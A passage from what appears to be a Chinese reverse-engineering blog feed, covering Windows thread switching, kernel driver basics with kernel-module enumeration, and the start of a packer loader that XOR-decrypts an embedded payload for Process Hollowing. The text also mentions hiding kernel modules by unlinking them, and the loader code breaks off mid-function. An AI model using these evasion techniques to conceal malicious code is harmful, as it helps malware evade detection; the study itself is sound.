class="hljs-keyword">void</span>* lpParameter), <span class="hljs-keyword">void</span>* lpParameter)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> i;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; GMThreadList[i].name; i++)<br>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> == _stricmp(GMThreadList[i].name, name))<br>&#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>initGMThread(&amp;GMThreadList[i], name, func, lpParameter);<br><br><span class="hljs-keyword">return</span> (i &amp; <span class="hljs-number">0x55AA0000</span>);<br>&#125;<br><br><span class="hljs-comment">//切换线程1：当前线程结构体指针 2：要切换的线程结构体指针</span><br>__declspec(naked) <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">SwitchContext</span><span class="hljs-params">(GMThread_t* SrcGMThreadp, GMThread_t* DstGMThreadp)</span></span><br><span class="hljs-function"></span>&#123;<br>__asm<br>&#123;<br><span class="hljs-comment">//提升堆栈</span><br>push ebp<br>mov ebp, esp<br><br><span class="hljs-comment">//保存当前线程寄存器</span><br>push edi<br>push esi<br>push ebx<br>push ecx<br>push edx<br>push eax<br><br>mov esi, SrcGMThreadp<br>mov edi, DstGMThreadp<br><br>mov[esi + GMThread_t.KernelStack], esp<br><br><span class="hljs-comment">//经典线程切换，另外一个线程复活</span><br>mov esp, [edi + GMThread_t.KernelStack]<br><br>pop eax<br>pop edx<br>pop ecx<br>pop ebx<br>pop esi<br>pop edi<br><br>pop ebp<br>ret<span class="hljs-comment">//把startup(线程函数入口)弹到eip 执行的就是线程函数了</span><br>&#125;<br>&#125;<br><br><span class="hljs-comment">//这个函数会让出cpu，从队列里重新选择一个线程执行</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Scheduling</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> TickCount = GetTickCount();<br><br>GMThread_t* SrcGMThreadp = &amp;GMThreadList[CurrentThreadIndex];<br>GMThread_t* DstGMThreadp = &amp;GMThreadList[<span class="hljs-number">0</span>];<br><br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; GMThreadList[i].name; i++)<br>&#123;<br><span class="hljs-keyword">if</span> (GMThreadList[i].Flags &amp; GMTHREAD_SLEEP)<br>&#123;<br><span class="hljs-keyword">if</span> (TickCount &gt; GMThreadList[i].SleepMillsecondDot)<br>&#123;<br>GMThreadList[i].Flags = GMTHREAD_READY;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (GMThreadList[i].Flags &amp; GMTHREAD_READY)<br>&#123;<br>DstGMThreadp = &amp;GMThreadList[i];<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><br>CurrentThreadIndex = DstGMThreadp - GMThreadList;<br><br>SwitchContext(SrcGMThreadp, DstGMThreadp);<br><br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">GMSleep</span><span class="hljs-params">(<span class="hljs-keyword">int</span> MilliSeconds)</span></span><br><span class="hljs-function"></span>&#123;<br>GMThread_t* GMThreadp;<br>GMThreadp = &amp;GMThreadList[CurrentThreadIndex];<br><br><span class="hljs-keyword">if</span> (GMThreadp-&gt;Flags != <span class="hljs-number">0</span>)<br>&#123;<br>GMThreadp-&gt;Flags = GMTHREAD_SLEEP;<br>GMThreadp-&gt;SleepMillsecondDot = GetTickCount() + MilliSeconds;<br>&#125;<br><br>Scheduling();<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Thread1</span><span class="hljs-params">(<span class="hljs-keyword">void</span>*)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Thread1\n&quot;</span>);<br>GMSleep(<span class="hljs-number">500</span>);<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Thread2</span><span class="hljs-params">(<span class="hljs-keyword">void</span>*)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Thread2\n&quot;</span>);<br>GMSleep(<span class="hljs-number">200</span>);<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Thread3</span><span class="hljs-params">(<span class="hljs-keyword">void</span>*)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Thread3\n&quot;</span>);<br>GMSleep(<span class="hljs-number">10</span>);<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Thread4</span><span class="hljs-params">(<span class="hljs-keyword">void</span>*)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Thread4\n&quot;</span>);<br>GMSleep(<span class="hljs-number">1000</span>);<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>代码是于海东老师的，直接拿过来编译即可使用，主要是逆向的过程</p><p><img src="image-20200722105812335.png" alt="image-20200722105812335"></p><p>前面函数单纯负责注册线程，真正切换线程在Scheduling函数中</p><p><img src="image-20200722105938429.png" alt="image-20200722105938429"></p><p>判断状态，然后当前线程主动call SwitchContext来让出cpu</p><p>具体切换过程就在SwitchContext中</p><p><img src="image-20200722110025824.png" alt="image-20200722110025824"></p><p>保存现场环境，然后堆栈切换后恢复环境</p><p><img src="image-20200722110118078.png" alt="image-20200722110118078"></p><p>返回时会回到GMThreadStartup，这边call了线程处理函数</p><p>函数call完后设置一波状态然后继续判断</p><p><img src="image-20200722110212411.png" alt="image-20200722110212411"></p><h2 id="KiSwapContext"><a href="#KiSwapContext" class="headerlink" title="KiSwapContext"></a>KiSwapContext</h2><p>来逆向一波内核函数，总体和上面模拟线程切换差不多</p><p><img src="image-20200729102000046.png" alt="image-20200729102000046"></p><p>来看看swapcontext</p><p><img src="image-20200729105325211.png" alt="image-20200729105325211"></p><p>总结一波线程切换知识</p><p>1.api调用//绝大部分api调用时都会判断是否要线程切换</p><p>2.时钟中断</p><p>3.异常</p><p><img src="image-20200729102025644.png" alt="image-20200729102025644"></p><p>这边还能看到tss的esp0</p><p><img src="image-20200729103533151.png" alt="image-20200729103533151"></p><p>具体如上图，eax是InitialStack</p><p>-0x210 -0x10后保存在tss中</p><p>这是因为内核堆栈结构所导致，0x210存放浮点寄存器值，然后紧跟着trap frame</p><p>可以看之前的笔记，trapframe一开始4个4字节是给虚拟8086用的所以是0x10</p><p>这就是为啥tss中esp0永远是当前线程的esp0</p><p>后面还往tss中存放cr3</p><p><img src="image-20200729104020382.png" alt="image-20200729104020382"></p><p>edi是kprocess</p><p>+18就是cr3了放到tss中然后切换cr3</p><p>继续往下看</p><p><img src="image-20200729104756803.png" alt="image-20200729104756803"></p><p>可以看到这个TEB相关</p><p>这也解释了为什么不管是什么线程fs都一样，他会把当前线程peb放到gdt表中，具体可以看之前段描述符结构，发现正好是吧地址填满了base addr</p><p>现在回去看一波线程优先级</p><p><img src="image-20200729111828055.png" alt="image-20200729111828055"></p><p>KiFindReadyThread后比较返回值是否为空，KiFindReadyThread其实就是遍历32个链表来根据优先级查找</p><p>如果链表为空那么开始跑idlethread</p><p>查看跳转处</p><p><img src="image-20200729111927533.png" alt="image-20200729111927533"></p><p>取出idlethread放到eax中然后跳转</p><p><img src="image-20200729111947770.png" alt="image-20200729111947770"></p><p>这边_KiIdleSummary是个dword每个位用来表示每个优先级的链表是否为空</p><p>windbg查看一波链表</p><p><img src="image-20200729112134138.png" alt="image-20200729112134138"></p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows驱动</title>
    <link href="/2020/06/11/windows%E9%A9%B1%E5%8A%A8/"/>
    <url>/2020/06/11/windows%E9%A9%B1%E5%8A%A8/</url>
    
    <content type="html"><![CDATA[<p>驱动基础</p><a id="more"></a><h1 id="驱动"><a href="#驱动" class="headerlink" title="驱动"></a>驱动</h1><h2 id="驱动环境"><a href="#驱动环境" class="headerlink" title="驱动环境"></a>驱动环境</h2><p>因为老早前就整过驱动了，环境重新搭了下。</p><p>这边是win10专业版，虚拟机也是win10专业版</p><p><img src="image-20200705145916994.png" alt="image-20200705145916994"></p><p><img src="image-20200707153903687.png" alt="image-20200707153903687"></p><p><img src="image-20200707153922061.png" alt="image-20200707153922061"></p><p>首先配置调试环境，这边按图设置一波就行</p><p>然后是软件配置这边安利俩个工具DriverMonitor和Dbgview，记得用管理员权限打开</p><p><img src="image-20200705151121257.png" alt="image-20200705151121257"></p><p>驱动代码如下</p><p><img src="image-20200705151216292.png" alt="image-20200705151216292"></p><p>就成功了，如果报错签名问题的话重启电脑在启动设置那边禁用驱动签名</p><p><img src="image-20200705150932187.png" alt="image-20200705150932187"></p><p>但是这是一次性的重启一次就不行了</p><p>需要永久禁用驱动签名的话输入bcdedit -set {default} TESTSIGNING on来启动测试模式</p><p><img src="image-20200706134904077.png" alt="image-20200706134904077"></p><p>再说说调试<br><img src="image-20200707154727646.png" alt="image-20200707154727646"></p><p>遇到符号路径问题输入</p><p>! sym</p><p>.reload</p><p>即可</p><h2 id="驱动模块知识"><a href="#驱动模块知识" class="headerlink" title="驱动模块知识"></a>驱动模块知识</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;ntddk.h&gt;</span></span><br><span class="hljs-function">VOID <span class="hljs-title">Unload</span><span class="hljs-params">(IN PDRIVER_OBJECT pDriverObject)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> STATUS_SUCCESS;<br>&#125;<br><br><span class="hljs-function">NTSTATUS <span class="hljs-title">DriverEntry</span><span class="hljs-params">(IN PDRIVER_OBJECT  pDriverObject, IN PUNICODE_STRING  RegistryPath)</span> </span>&#123;<br>    DbgPrint(<span class="hljs-string">&quot;%p,%wZ&quot;</span>, pDriverObject, RegistryPath);<br>    pDriverObject-&gt;DriverUnload = Unload;<br>    <span class="hljs-keyword">return</span> STATUS_SUCCESS;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>编译加载，dbgview查看</p><p>FFFF870B6A6A8E30,\REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\Kernel_learning</p><p>windbg查看对应结构体_driver_object</p><p><img src="image-20200711201509953.png" alt="image-20200711201509953"></p><p>可以看到我们加载驱动的许多信息</p><p>再看看ldr，这个和三环peb的很像，在三环隐藏进程需要断链断三个，0环order和init不使用，所以只有第一个加载顺序，把所有内核模块都存在一个链表里,我们可以通过这个遍历所有内核模块</p><p><img src="image-20200711235534638.png" alt="image-20200711235534638"></p><p>可以看到内核文件还有硬件抽象层dll</p><p>接下去尝试一波写代码遍历所有内核模块，成果如下</p><p><img src="image-20200712002747826.png" alt="image-20200712002747826"></p><p>代码如下(把驱动名改成模块名更准确些，但就不钻牛角尖了)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;ntddk.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">LDR_DATA_TABLE_ENTRY</span> &#123;</span><br>LIST_ENTRY InLoadOrderLinks;<br>LIST_ENTRY InMemoryOrderLinks;<br>LIST_ENTRY InInitializationOrderLinks;<br>PVOID DllBase;<br>PVOID EntryPoint;<br>ULONG SizeOfImage;<br>UNICODE_STRING FullDllName;<br>UNICODE_STRING BaseDllName;<br>ULONG Flags;<br>USHORT LoadCount;<br>USHORT TlsIndex;<br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>LIST_ENTRY HashLinks;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>PVOID SectionPointer;<br>ULONG CheckSum;<br>&#125;;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>ULONG TimeDateStamp;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>PVOID LoadedImports;<br>&#125;;<br>&#125;;<br>&#125; LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;<br><br><span class="hljs-function">VOID <span class="hljs-title">Unload</span><span class="hljs-params">(IN PDRIVER_OBJECT pDriverObject)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> STATUS_SUCCESS;<br>&#125;<br><br><span class="hljs-function">NTSTATUS <span class="hljs-title">DriverEntry</span><span class="hljs-params">(IN PDRIVER_OBJECT  pDriverObject, IN PUNICODE_STRING  RegistryPath)</span> </span>&#123;<br>LDR_DATA_TABLE_ENTRY* fuck1, * fuck2;<br>fuck1 = (LDR_DATA_TABLE_ENTRY*)pDriverObject-&gt;DriverSection;<br><span class="hljs-comment">//DbgPrint(&quot;驱动名%wZ\n&quot;, &amp;fuck1-&gt;FullDllName);</span><br>PLIST_ENTRY fuck3;<br>fuck3 = fuck1-&gt;InLoadOrderLinks.Flink;<br><span class="hljs-keyword">while</span> (TRUE)<br>&#123;<br>fuck2 = (LDR_DATA_TABLE_ENTRY*)fuck3;<br>DbgPrint(<span class="hljs-string">&quot;驱动名%wZ\n&quot;</span>, &amp;fuck2-&gt;FullDllName);<br>fuck3 = fuck3-&gt;Flink;<br><span class="hljs-keyword">if</span> (fuck3 == &amp;fuck1-&gt;InLoadOrderLinks)<br>&#123;<br>fuck2 = (LDR_DATA_TABLE_ENTRY*)fuck3;<br>DbgPrint(<span class="hljs-string">&quot;驱动名%wZ\n&quot;</span>, &amp;fuck2-&gt;FullDllName);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><br>    pDriverObject-&gt;DriverUnload = Unload;<br>    <span class="hljs-keyword">return</span> STATUS_SUCCESS;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>当然与三环相对应也能进行模块隐藏，三环只需要断链三个链表，0环除了做这个还有一个二叉平衡树需要操作</p><p>再来一波常规的驱动编程，其实驱动编程很win32控件很像，在win32控件中消息循环对不同消息做不同处理，而在内核中则是一个新的封装的结构体叫做IRP，在消息循环中消息对应窗口对象而在内核中则是设备对象。如果熟悉win32消息处理机制的话学起来其实特别轻松</p><p>基本编程思路是</p><p>1.创建设备对象</p><p>2.规定通信方式</p><p>3.注册符号链接</p><p>4.注册irp处理函数</p><p>5.编写irp处理函数</p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>简单的二进制加密壳</title>
    <link href="/2020/05/11/%E7%AE%80%E5%8D%95%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%AF%86%E5%A3%B3/"/>
    <url>/2020/05/11/%E7%AE%80%E5%8D%95%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%AF%86%E5%A3%B3/</url>
    
    <content type="html"><![CDATA[<p>说是说加密壳，但主要用到的技术是Process Hollowing</p><p>代码已发布在github上</p><a id="more"></a><h1 id="decode-shell"><a href="#decode-shell" class="headerlink" title="decode-shell"></a>decode-shell</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">UnloadShell</span><span class="hljs-params">(HANDLE ProcHnd, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> BaseAddr)</span></span>;<br><span class="hljs-function">LPVOID <span class="hljs-title">GetLastSecData</span><span class="hljs-params">(LPSTR lpszFile, DWORD&amp; fileSize)</span></span>;<br><span class="hljs-function">LPVOID <span class="hljs-title">AllocShellSize</span><span class="hljs-params">(LPSTR shellDirectory, HANDLE shellProcess, LPVOID encryptFileBuffer)</span></span>;<br><span class="hljs-function">VOID <span class="hljs-title">GetNtHeaderInfo</span><span class="hljs-params">(LPVOID pFileBuffer, DWORD&amp; ImageBase, DWORD&amp; ImageSize)</span></span>;<br><span class="hljs-function">VOID <span class="hljs-title">GetEncryptFileContext</span><span class="hljs-params">(LPVOID pFileBuffer, DWORD&amp; OEP, DWORD&amp; ImageBase)</span></span>;<br><span class="hljs-function">LPVOID <span class="hljs-title">FileBufferToImageBuffer</span><span class="hljs-params">(BYTE* decodebuffer, DWORD&amp; size)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">DoRelocation</span><span class="hljs-params">(LPVOID pFileBuffer, <span class="hljs-keyword">void</span>* OldBase, <span class="hljs-keyword">void</span>* NewBase)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>WCHAR shellDirectory[<span class="hljs-number">100</span>]; <span class="hljs-comment">//encode后程序这边有个坑，win32api通常是宽字符然而自己写的函数不需要</span><br>DWORD encryptSize = <span class="hljs-number">0</span>;<br>mbstowcs(shellDirectory, argv[<span class="hljs-number">0</span>], <span class="hljs-number">100</span>);<span class="hljs-comment">//宽字符转换</span><br>LPVOID encryptFileBuffer = <span class="hljs-literal">NULL</span>;<br>encryptFileBuffer = GetLastSecData(argv[<span class="hljs-number">0</span>], encryptSize);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">这边可以写解密函数</span><br><span class="hljs-comment">*/</span><br>srand(<span class="hljs-number">233</span>);<br><span class="hljs-keyword">int</span> i;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> key;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; encryptSize; i++)<br>&#123;<br>key = rand();<br>*((BYTE*)encryptFileBuffer + i) ^= key;<br>&#125;<br><span class="hljs-comment">//解密完成</span><br>STARTUPINFO si = &#123; <span class="hljs-number">0</span> &#125;;<br>PROCESS_INFORMATION pi;<br>si.cb = <span class="hljs-keyword">sizeof</span>(si);<br>::CreateProcess(shellDirectory, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, FALSE, CREATE_SUSPENDED, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;si, &amp;pi);<br><span class="hljs-comment">//int x = GetLastError();</span><br><span class="hljs-comment">//printf(&quot;%d\n&quot;, x);</span><br><span class="hljs-keyword">char</span> szTempStr[<span class="hljs-number">256</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-comment">//sprintf(szTempStr, &quot;process_information %x , %x \n&quot;, pi.hProcess, 